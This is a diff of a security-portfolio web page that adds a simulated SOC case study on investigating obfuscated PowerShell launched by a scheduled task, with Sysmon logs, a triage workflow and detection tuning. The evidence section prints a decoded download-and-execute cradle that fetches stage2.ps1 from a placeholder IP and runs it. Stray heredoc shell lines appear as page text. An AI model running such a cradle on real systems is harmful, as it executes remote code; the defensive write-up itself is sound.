@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Cybersecurity and Privacy Documentation">
+        <meta name="description" content="Defensive Operations, Threat Analysis & Security Testing">
       
       
         <meta name="author" content="Privacy Skill Vault">
@@ -82,7 +82,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#investigations" class="md-skip">
+        <a href="#operational-investigations-threat-triage" class="md-skip">
           Skip to content
         </a>
       
@@ -94,14 +94,19 @@
     
       <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="header.title">
+
+    <!-- Left: Brand Logo & Title -->
     <a href="https://privacyskillvault.com/" title="Privacy Skill Vault" class="md-header__button md-logo" aria-label="Privacy Skill Vault">
       <img src="../assets/branding/PSV-colored.png" alt="Privacy Skill Vault Logo">
     </a>
+
     <div class="md-header__title" data-md-component="header-title">
       <div class="md-header__ellipsis">
         <span class="psv-brand-title">Privacy Skill Vault</span>
       </div>
     </div>
+
+    <!-- Right: Static Six-Page Global Navigation -->
     <nav id="psv-global-nav" class="psv-global-nav" aria-label="Global Navigation">
       <ul class="psv-global-nav__list">
         <li class="psv-global-nav__item">
@@ -124,6 +129,8 @@
         </li>
       </ul>
     </nav>
+
+    <!-- Native Theme Switch -->
     
       
         <form class="md-header__option" data-md-component="palette">
@@ -151,6 +158,8 @@
 </form>
       
     
+
+    <!-- Accessible Mobile Navigation Toggle -->
     <button
       type="button"
       class="psv-mobile-menu-toggle"
@@ -177,6 +186,7 @@
         <line x1="3" y1="18" x2="21" y2="18"></line>
       </svg>
     </button>
+
   </nav>
 </header>
     
@@ -308,6 +318,24 @@
         
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Investigations
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -324,6 +352,53 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#featured-case-study-id-inv-024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Featured Case Study — ID: INV-024
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Featured Case Study — ID: INV-024">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#investigating-obfuscated-powershell-execution-via-scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Investigating Obfuscated PowerShell Execution via Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -403,6 +478,42 @@
     
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#featured-case-study-id-inv-024" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Featured Case Study — ID: INV-024
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Featured Case Study — ID: INV-024">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#investigating-obfuscated-powershell-execution-via-scheduled-tasks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Investigating Obfuscated PowerShell Execution via Scheduled Tasks
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -418,8 +529,106 @@
 
 
 
-<h1 id="investigations">Investigations<a class="headerlink" href="#investigations" title="Permanent link">&para;</a></h1>
-<p>Investigations Vault</p>
+<p>cat &lt;&lt;'EOF' &gt; docs/investigations/index.md</p>
+<h1 id="operational-investigations-threat-triage">Operational Investigations &amp; Threat Triage<a class="headerlink" href="#operational-investigations-threat-triage" title="Permanent link">&para;</a></h1>
+<p>Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios. Documenting investigation methodologies, detection logic, and false-positive reduction.</p>
+<div style="display: flex; gap: var(--psv-space-2); flex-wrap: wrap; margin-top: var(--psv-space-4); margin-bottom: var(--psv-space-6);">
+  <span class="md-button md-button--primary" style="font-size: 0.75rem; padding: 4px 12px;">All</span>
+  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">SIEM &amp; Log Analysis</span>
+  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">Network &amp; PCAP</span>
+  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">Endpoint Telemetry</span>
+  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">False Positives</span>
+</div>
+
+<hr />
+<h2 id="featured-case-study-id-inv-024">Featured Case Study — ID: INV-024<a class="headerlink" href="#featured-case-study-id-inv-024" title="Permanent link">&para;</a></h2>
+<h3 id="investigating-obfuscated-powershell-execution-via-scheduled-tasks">Investigating Obfuscated PowerShell Execution via Scheduled Tasks<a class="headerlink" href="#investigating-obfuscated-powershell-execution-via-scheduled-tasks" title="Permanent link">&para;</a></h3>
+<div style="display: flex; gap: var(--psv-space-2); flex-wrap: wrap; margin-bottom: var(--psv-space-4);">
+  <span style="background: rgba(245, 158, 11, 0.1); color: var(--psv-warning); border: 1px solid var(--psv-warning); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
+    Severity: Medium
+  </span>
+  <span style="background: rgba(16, 185, 129, 0.1); color: var(--psv-success); border: 1px solid var(--psv-success); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
+    Status: Closed / Resolved
+  </span>
+  <span style="background: rgba(56, 189, 248, 0.1); color: var(--psv-accent); border: 1px solid var(--psv-accent); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
+    Category: Host Telemetry &amp; SIEM
+  </span>
+</div>
+
+<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: var(--psv-space-6); font-size: 0.825rem;">
+
+  <div>
+    <div class="psv-card" style="margin-bottom: var(--psv-space-4);">
+      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
+        1. Incident Trigger &amp; Initial Context
+      </h3>
+      <ul>
+        <li><strong>Alert Name:</strong> <code>SUSPICIOUS_POWERSHELL_BASE64_EXEC</code></li>
+        <li><strong>Trigger Source:</strong> Windows Security Event Log (Event ID 4688) on endpoint <code>HOST-FIN-02</code>.</li>
+        <li><strong>Initial Observation:</strong> An automated SIEM alert flagged an obfuscated PowerShell command executing under the SYSTEM account outside standard maintenance hours.</li>
+      </ul>
+    </div>
+
+    <div class="psv-card">
+      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
+        3. Investigation &amp; Triage Workflow
+      </h3>
+      <ol>
+        <li><strong>Payload Decoding:</strong> Extracted the Base64 string from Sysmon Event ID 1 and decoded the payload using CyberChef to identify the outbound destination.</li>
+        <li><strong>Parent-Child Process Analysis:</strong> Verified that <code>powershell.exe</code> was spawned directly by <code>taskeng.exe</code> (Windows Scheduled Tasks Engine), confirming automated persistence rather than interactive execution.</li>
+        <li><strong>Network Telemetry Correlation:</strong> Cross-referenced network firewall logs for outbound connections to <code>192.0.2.45</code>. Identified 12 outbound connection attempts within a 3-minute window.</li>
+        <li><strong>Host Verification:</strong> Interviewed the system administration team and checked local task scheduler definitions. Confirmed an unannounced legacy maintenance script was executing without updated service account encapsulation.</li>
+      </ol>
+    </div>
+  </div>
+
+  <div>
+    <div class="psv-card" style="margin-bottom: var(--psv-space-4);">
+      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
+        2. Telemetry &amp; Log Evidence
+      </h3>
+
+      <p style="font-size: 0.75rem; color: var(--psv-text-muted); margin-bottom: 4px;"><strong>Sysmon Event ID 1 (Process Creation):</strong></p>
+
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>UtcTime: 2026-07-12 02:14:08.112
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>ProcessId: 4820
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>CommandLine: powershell.exe -NoP -NonI -W Hidden -e aXdX... [Base64 Truncated]
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>ParentImage: C:\Windows\System32\taskeng.exe
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>User: NT AUTHORITY\SYSTEM
+</span></code></pre></div>
+
+      <p style="font-size: 0.75rem; color: var(--psv-text-muted); margin-top: 8px; margin-bottom: 4px;"><strong>Script Block Logging (Windows Event ID 4104) Decoded Payload:</strong></p>
+
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nv">$cli</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="nv">$data</span> <span class="p">=</span> <span class="nv">$cli</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'http://192.0.2.45/stage2.ps1'</span><span class="p">)</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">Invoke-Expression</span> <span class="nv">$data</span>
+</span></code></pre></div>
+
+    </div>
+
+    <div class="psv-card">
+      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
+        4. Root Cause &amp; Detection Tuning
+      </h3>
+
+      <p style="color: var(--psv-text-muted); margin-bottom: var(--psv-space-2);">
+        <strong>Verdict:</strong> Authorized Administrator Misconfiguration (True Positive for policy violation, False Positive for active malware).
+      </p>
+
+      <strong style="color: var(--psv-text); font-size: 0.75rem; display: block; margin-bottom: var(--psv-space-1);">Remediation &amp; Detection Tuning:</strong>
+
+      <ul>
+        <li>Reconfigured the admin task to run via a dedicated service account with restricted privileges.</li>
+        <li>Updated the SIEM detection rule to alert specifically on unquoted administrative script paths while keeping base-64 PowerShell flags flagged for non-standard parent processes.</li>
+      </ul>
+    </div>
+  </div>
+
+</div>
+
+<p><a class="md-button md-button--primary" href="https://investigations.privacyskillvault.com/">Explore the Investigations Vault →</a></p>
+<p>EOF</p>
 
 
 
